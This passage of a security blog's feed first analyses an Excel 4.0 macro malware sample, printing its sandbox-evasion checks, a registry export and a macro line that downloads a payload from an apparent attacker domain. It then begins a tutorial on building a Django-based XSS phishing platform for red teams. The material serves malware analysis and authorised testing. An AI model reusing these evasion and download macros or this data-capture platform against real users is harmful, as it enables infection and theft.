plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oledump.py -p plugin_biff.py --pluginoptions &quot;-o BOUNDSHEET -a&quot; &#x2F;Users&#x2F;ascotbe&#x2F;Downloads&#x2F;Info_695.xls</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/12.png?raw=true" alt="image-20210308143858216"></p><p>可以看到定位到了宏的位置<strong>D0 66 02 00 02 01 0A 00</strong>，只需要修改第5个字节位置的02即可打开深度隐藏宏</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/13.png?raw=true" alt="image-20210308144106093"></p><h5 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;IF(GET.WORKSPACE(19),,CLOSE(TRUE))#检查是否存在鼠标，如果GET.WORKSPACE获取的值为false的话，就执行CLOSE保存关闭表格。if函数第二个参数是判断第一个参数返回值为ture执行位置，第三个参数是判断第一个参数返回值为false执行位置</span><br><span class="line">&#x3D;IF(GET.WORKSPACE(42),,CLOSE(TRUE))#计算机是否能够播放声音</span><br><span class="line">&#x3D;IF(ISNUMBER(SEARCH(&quot;Windows&quot;,GET.WORKSPACE(1))), ,CLOSE(TRUE))#检查运行Microsoft Excel的环境，然后检查环境的版本号</span><br></pre></td></tr></table></figure><p>如果这三个是正确的，则将Excel安全注册表项复制到<strong>C:\Users\public\1.reg</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;CALL(&quot;Shell32&quot;,&quot;ShellExecuteA&quot;,&quot;JJCCCJJ&quot;,0,&quot;open&quot;,&quot;C:\Windows\system32\reg.exe&quot;,&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;&amp;GET.WORKSPACE(2)&amp;&quot;\Excel\Security c:\users\public\1.reg &#x2F;y&quot;,0,5)</span><br></pre></td></tr></table></figure><p>接下来，它等待三秒钟。然后它打开1.reg，从字节位置215开始，并读取接下来的255个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;WAIT(NOW()+&quot;00:00:03&quot;)</span><br><span class="line">&#x3D;FOPEN(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">&#x3D;FPOS(Q10, 215)</span><br><span class="line">&#x3D;FREAD(Q10, 255)</span><br></pre></td></tr></table></figure><p>提取出来的<a href="https://app.any.run/tasks/aaf8a9aa-5068-42dd-89cf-cd610ce5e730/">1.reg</a>内容</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/11.png?raw=true" alt="image-20210308180750093"></p><p>1.reg被关闭并删除。然后它在读取的内容（存储在单元格Q12中）中搜索字符串“ 0001”。这是第二次测试，看它是否在沙箱中。如果找到该字符串，它将关闭电子表格。如果找不到字符串“ 0001”，它将尝试下载文件并将其另存为.html文件在**C:\Users\Public\**中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;FCLOSE(Q10)</span><br><span class="line">&#x3D;FILE.DELETE(&quot;c:\users\public\1.reg&quot;)</span><br><span class="line">&#x3D;IF(ISNUMBER(SEARCH(&quot;0001&quot;,Q12)),CLOSE(FALSE),)</span><br><span class="line">&#x3D;CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCJJ&quot;,0,&quot;https:&#x2F;&#x2F;efbzfyvsb.website&#x2F;f2f23&quot;,&quot;c:\Users\Public\b7gf5yk.html&quot;,0,0)</span><br></pre></td></tr></table></figure><p>完整的英文语法文档<a href="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/Excel4.0MacroFunctionsReference.pdf">下载</a>，中文版<a href="https://github.com/Ascotbe/Random-img/blob/master/OfficeExcelMacro/MacrofunCn.hlp">下载</a>，一个在线的Excel xml宏函数<a href="http://www.cpearson.com/excel/call.htm">文档</a>里面比官网文档全面</p><p>关于注册表reg文件的解释参考这篇<a href="https://www.cnblogs.com/fczjuever/archive/2013/04/09/3010711.html">博客</a></p><p>最后贴上代码转ASCII代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;&quot;&quot;xxx&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    print(<span class="string">&quot;=CHAR(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="Macro-5-0"><a href="#Macro-5-0" class="headerlink" title="Macro 5.0"></a>Macro 5.0</h3><p>关于VBA宏的制作这里就不概述了，可以参考之前的<a href="https://www.ascotbe.com/2020/07/26/office_0x01/#Office%E5%AE%8F">文章</a>，可以看到word和excel的vba宏是通用的</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;clickallthethings.wordpress.com&#x2F;2020&#x2F;04&#x2F;06&#x2F;covid-19-excel-4-0-macros-and-sandbox-detection&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.yuque.com&#x2F;p1ut0&#x2F;qtmgyx&#x2F;rqank4</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>从零开始编写XSS平台</title>
    <link href="https://www.ascotbe.com/2021/01/08/CrossSiteScripting/"/>
    <id>https://www.ascotbe.com/2021/01/08/CrossSiteScripting/</id>
    <published>2021-01-08T10:45:42.000Z</published>
    <updated>2021-05-04T06:03:28.413Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>在我们日常渗透或者红队打点的时候都或多或少的会挖掘到XSS漏洞，由于红队钓鱼也经常用到XSS平台，虽然网上免费可以注册的平台很多，但是这些平台都是别人的首先钓鱼到的数据并不是只有你一个人可见，网站的管理员也可以看的到，这就会对某些敏感的红队项目的信息造成泄漏，其次网站也经常不稳定，尝尝十天半个月就要换一个平台重新来一次，所以这篇文章就来了~</p><ul><li>项目地址：<a href="https://github.com/Ascotbe/Medusa">https://github.com/Ascotbe/Medusa</a></li></ul><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/1.gif?raw=true" alt="938393FBC8A524B353CE58DCC17095F4" style="zoom:50%;" /><h2 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h2><p><strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p><p>Cross-site scripting的英文首字母缩写本应为<strong>CSS</strong>，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading Style Sheets），所以将Cross（意为“交叉”）改以交叉形的<strong>X</strong>做为缩写。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h2 id="框架选用"><a href="#框架选用" class="headerlink" title="框架选用"></a>框架选用</h2><h3 id="什么是Django"><a href="#什么是Django" class="headerlink" title="什么是Django"></a>什么是Django</h3><p><strong>Django</strong>是一个开放源代码的Web应用框架，由Python写成。采用了MVT的软件设计模式，即模型（Model），视图（View）和模板（Template）。它在开发初期用于管理劳伦斯出版集团旗下的一些以新闻为主的网站。Django于2005年7月在BSD许可证下发布，它的名字来源于比利时的吉普赛爵士吉他手Django Reinhardt。</p><p>Django的主要目标是简化数据库驱动的网站的开发。Django注重组件的重用性和“可插拔性”，敏捷开发和DRY法则（Don’t Repeat Yourself）。在Django中普遍使用的语言是Python，甚至包括配置文件和数据模型。</p><h3 id="为什么不用Flask"><a href="#为什么不用Flask" class="headerlink" title="为什么不用Flask"></a>为什么不用Flask</h3><blockquote><p>Flask 怎么定位自己的？</p></blockquote><p>将自己定位为微框架。<strong>啥叫微框架，就是毛坯房的意思。给你个毛胚房，你自己装修去。</strong></p><ul><li><p><strong>表单怎么解决？</strong>从社区找了个 Flask-Form</p></li><li><p><strong>跨站攻击？</strong> 社区 Flask-Form 帮你做了。</p></li><li><p><strong>登陆认证鉴权怎么搞定？</strong> 自己写 User 模块。</p></li><li><p><strong>ORM 怎么挑选？</strong>flask-sqlalchemy 自己组装一下。等等 SQLAlchemy 是什么玩意？ query 语法写起来怎么这么原始…</p></li><li><p><strong>DBMigration 怎么做？</strong> Alembic 配合 SQLAlchemy, 等等，SQLAlchemy?? Alembic</p></li><li><p><strong>缓存怎么做？</strong> 自己手动封装一下 RedisPy</p></li></ul><blockquote><p>Django 怎么定位标榜自己的？</p></blockquote><p>划重点 The web framework for perfectionists with deadlines. <strong>完美主义者的 Deadline 终结框架</strong></p><p>定位不同，就会导致设计上和功能上的倾向性。</p><ul><li><p><strong>表单怎么解决？</strong> Django Form 很好用呀。</p></li><li><p><strong>跨站攻击？</strong> Django 帮你做了 csrftoken</p></li><li><p><strong>登陆认证鉴权怎么搞定？</strong> Django 自带了 backend 和 auth 模块。</p></li><li><p><strong>ORM 怎么挑选？</strong>Django ORM 很好用。</p></li><li><p><strong>DBMigration 怎么做？</strong> Django Migration 了解一些？</p></li><li><p><strong>缓存怎么做？</strong> Django Cache 了解一下？</p></li></ul><p>虽然我们整体架构都是自己纯手撸，使用Flask会更适合我们，但是大家有没有听过一句话：<strong>我可以不用，但是我不能没有（逃</strong></p><h3 id="Django简单演示"><a href="#Django简单演示" class="headerlink" title="Django简单演示"></a>Django简单演示</h3><h4 id="首先创建一个项目"><a href="#首先创建一个项目" class="headerlink" title="首先创建一个项目"></a>首先创建一个项目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 django-admin.py  startproject demo</span><br></pre></td></tr></table></figure><p>项目中只有3个函数</p><ul><li>显示文本</li><li>加法运算</li><li>加法运算后写入数据库</li></ul><h4 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── demo</span><br><span class="line">│   ├── asgi.py   </span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   ├── wsgi.py</span><br><span class="line">│   └── XSS</span><br><span class="line">│       ├── __init__.py</span><br><span class="line">│       └── test.py</span><br><span class="line">├── manage.py</span><br><span class="line">├── Database.py</span><br><span class="line">└── xss.db</span><br></pre></td></tr></table></figure><p>在这结构中我们只需要关这三个文件</p><ul><li><p><code>Database.py</code>数据库写入相关文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetRootFileLocation</span>:</span>  <span class="comment"># 获取当前文件路径类</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Result</span>(<span class="params">self</span>) -&gt; str:</span></span><br><span class="line">        system_type = sys.platform</span><br><span class="line">        <span class="keyword">if</span> system_type == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line">        <span class="keyword">elif</span> system_type == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> system_type == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            RootFileLocation = os.path.split(os.path.realpath(__file__))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> RootFileLocation</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetDatabaseFilePath</span>:</span>  <span class="comment"># 数据库文件路径返回值</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">result</span>(<span class="params">self</span>) -&gt; str:</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;cygwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;\\xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line">        <span class="keyword">elif</span> sys.platform == <span class="string">&quot;linux&quot;</span> <span class="keyword">or</span> sys.platform == <span class="string">&quot;darwin&quot;</span>:</span><br><span class="line">            DatabaseFilePath = GetRootFileLocation().Result() + <span class="string">&quot;/xss.db&quot;</span></span><br><span class="line">            <span class="keyword">return</span> DatabaseFilePath</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdditionOperation</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.con = sqlite3.connect(GetDatabaseFilePath().result())</span><br><span class="line">        <span class="comment"># 获取所创建数据的游标</span></span><br><span class="line">        self.cur = self.con.cursor()</span><br><span class="line">        <span class="comment"># 创建表</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;CREATE TABLE AdditionOperation\</span></span><br><span class="line"><span class="string">                                (id INTEGER PRIMARY KEY,\</span></span><br><span class="line"><span class="string">                                a TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                b TEXT NOT NULL,\</span></span><br><span class="line"><span class="string">                                calculation result TEXT NOT NULL)&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Write</span>(<span class="params">self, **kwargs</span>) -&gt; bool or <span class="keyword">None</span>:</span>  <span class="comment"># 写入相关信息</span></span><br><span class="line"></span><br><span class="line">        A = kwargs.get(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        B = kwargs.get(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cur.execute(<span class="string">&quot;INSERT INTO AdditionOperation(a,b,calculation)\</span></span><br><span class="line"><span class="string">                VALUES (?,?,?)&quot;</span>, (A,B,<span class="built_in">int</span>(A)+<span class="built_in">int</span>(B),))</span><br><span class="line">            <span class="comment"># 提交</span></span><br><span class="line">            self.con.commit()</span><br><span class="line">            self.con.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p><code>urls.py</code>路由表，用来表示连接和路由的关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> demo.XSS.test <span class="keyword">import</span> SayHello,Add,AddToDatabase</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;sey_hello/&#x27;</span>, SayHello),</span><br><span class="line">    path(<span class="string">&#x27;add/&#x27;</span>, Add),</span><br><span class="line">    path(<span class="string">&#x27;add_to_database/&#x27;</span>, AddToDatabase),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p><code>test.py</code>演示的三个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> JsonResponse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Database <span class="keyword">import</span> AdditionOperation</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SayHello</span>(<span class="params">request</span>):</span><span class="comment">#判断请求方式后说你好</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is POST~&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Hello this is GET&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">request</span>):</span><span class="comment">#进行加法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用POST！&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;a&quot;: &quot;1&quot;,</span></span><br><span class="line"><span class="string">&quot;b&quot;: &quot;2&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddToDatabase</span>(<span class="params">request</span>):</span><span class="comment">#进行加法后写入数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        A = json.loads(request.body)[<span class="string">&quot;a&quot;</span>]</span><br><span class="line">        B = json.loads(request.body)[<span class="string">&quot;b&quot;</span>]</span><br><span class="line">        AdditionOperation().Write(a=A,b=B)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="built_in">int</span>(A)+<span class="built_in">int</span>(B), <span class="string">&#x27;code&#x27;</span>: <span class="number">200</span>, &#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;请使用POST！&#x27;</span>, <span class="string">&#x27;code&#x27;</span>: <span class="number">500</span>, &#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="演示效果"><a href="#演示效果" class="headerlink" title="演示效果"></a>演示效果</h4><p>在文件更目录启动项目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py runserver <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">9999</span> --insecure   </span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/2.gif?raw=true" alt="1"></p><p>可以看到数据库文件中也写入了相关数据</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/3.png?raw=true" alt="image-20210108160831363"></p><h2 id="平台设计"><a href="#平台设计" class="headerlink" title="平台设计"></a>平台设计</h2><h3 id="项目关系图"><a href="#项目关系图" class="headerlink" title="项目关系图"></a>项目关系图</h3><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/4.png?raw=true" alt="图片1"></p><h3 id="项目的逻辑"><a href="#项目的逻辑" class="headerlink" title="项目的逻辑"></a>项目的逻辑</h3><p>除去存放类函数的文件和用户认证文件，整体的文件逻辑如下图</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/5.png?raw=true" alt="image-20210108135555397"></p><h3 id="API接口"><a href="#API接口" class="headerlink" title="API接口"></a>API接口</h3><p>一个XSS平台在不考虑用户登录的情况下，只需要<strong>11</strong>个API接口以及<strong>3</strong>张表即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">接收数据：&#x2F;a&#x2F;xxxxx</span><br><span class="line">加载文件：&#x2F;s&#x2F;xxxxx</span><br><span class="line">创建跨站脚本钓鱼项目：&#x2F;api&#x2F;create_cross_site_script_project&#x2F; </span><br><span class="line">查询跨站脚本钓鱼项目：&#x2F;api&#x2F;query_cross_site_script_project&#x2F;</span><br><span class="line">查询跨站脚本钓鱼项目接收的数据：&#x2F;api&#x2F;query_cross_site_script_project_data&#x2F;</span><br><span class="line">读取用户自定义跨站脚本模板数据：&#x2F;api&#x2F;read_cross_site_script_template&#x2F;</span><br><span class="line">读取默认跨站脚本模板数据：&#x2F;api&#x2F;read_default_cross_site_script_template&#x2F;</span><br><span class="line">保存用户自定义跨站脚本模板数据：&#x2F;api&#x2F;save_cross_site_script_template&#x2F;</span><br><span class="line">修改用户自定义跨站脚本模板数据：&#x2F;api&#x2F;modify_cross_site_script_template&#x2F;</span><br><span class="line">修改跨站脚本钓鱼项目：&#x2F;api&#x2F;modify_cross_site_script_project&#x2F;</span><br><span class="line">查询跨站脚本钓鱼项目的详细信息：&#x2F;api&#x2F;query_cross_site_script_project_info</span><br></pre></td></tr></table></figure><p>Django中路由表(urls.py)显示如下：</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/6.png?raw=true" alt="image-20210108135851293"></p><h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">存放接收数据表：CrossSiteScript</span><br><span class="line">存放项目信息表：CrossSiteScriptProject</span><br><span class="line">存放自定义模板表：CrossSiteScriptTemplate</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/CrossSiteScripting/7.png?raw=true" alt="image-20210108140227379"></p><h3 id="函数讲解"><a href="#函数讲解" class="headerlink" title="函数讲解"></a>函数讲解</h3><p>该模块所有函数逻辑结构都相同，为了不浪费大家的时间，当前就挑选一个生产项目的函数出来讲解，如果想了解各个接口相关参数可以查阅<a href="http://medusa.ascotbe.com/Documentation/#/API/CrossSiteScript">文档</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenerateProject</span>(<span class="params">request</span>):</span><span class="comment">#用来生成项目，并且生成文件和用户绑定</span></span><br><span class="line">    RequestLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            JavaScriptFileData = json.loads(request.body)[<span class="string">&quot;javascript_data&quot;</span>]<span class="comment">#获取前端传入的加密过的js文件数据</span></span><br><span class="line">            ProjectName = json.loads(request.body)[<span class="string">&quot;project_name&quot;</span>]<span class="comment">#用户自定义的项目名</span></span><br><span class="line">            UserToken = json.loads(request.body)[<span class="string">&quot;token&quot;</span>]</span><br><span class="line">            Uid = UserInfo().QueryUidWithToken(UserToken)  <span class="comment"># 如果登录成功后就来查询用户名</span></span><br><span class="line">            <span class="keyword">if</span> Uid != <span class="literal">None</span> <span class="keyword">and</span> JavaScriptFileData!=<span class="literal">None</span>:  <span class="comment"># 查到了UID,并且js数据不为空</span></span><br><span class="line">                UserOperationLogRecord(request, request_api=<span class="string">&quot;create_cross_site_script_project&quot;</span>, uid=Uid)</span><br><span class="line">                GetJavaScriptFilePath().Result()<span class="comment">#获取js文件路径</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#如果查询确实冲突了</span></span><br><span class="line">                    JavaScriptSaveFileName=randoms().result(<span class="number">5</span>)<span class="comment">#文件名</span></span><br><span class="line">                    QueryJavaScriptSaveFileNameValidity = CrossSiteScriptProject().RepeatInvestigation(file_name=JavaScriptSaveFileName)<span class="comment">#判断文件是否重复</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> QueryJavaScriptSaveFileNameValidity:<span class="comment">#如果不冲突的话跳出循环</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  <span class="comment"># 获得保存路径</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(JavaScriptSaveRoute, <span class="string">&#x27;w+&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(base64.b64decode(<span class="built_in">str</span>(JavaScriptFileData).encode(<span 